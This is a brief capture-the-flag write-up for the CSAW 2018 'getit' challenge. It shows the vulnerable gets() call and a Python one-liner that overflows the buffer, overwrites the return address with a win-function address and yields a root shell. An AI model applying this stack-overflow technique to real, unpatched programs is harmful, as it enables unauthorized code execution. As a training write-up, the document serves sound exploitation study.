# CSAW 2018 getit

```PIE``` and ```canary``` are disabled. Easy overflow and call to win function. 

```c
  puts("Do you gets it??");
  gets(local_28);
  return 0;
```

```bash
[root@pwn:~/csaw18_getit]$ (python -c 'print "A" * 32 + "BBBBBBBB"  + "\xb6\x05\x40\
x00\x00\x00\x00\x00"'; cat -) | ./get_it 
Do you gets it??
whoami
root
```
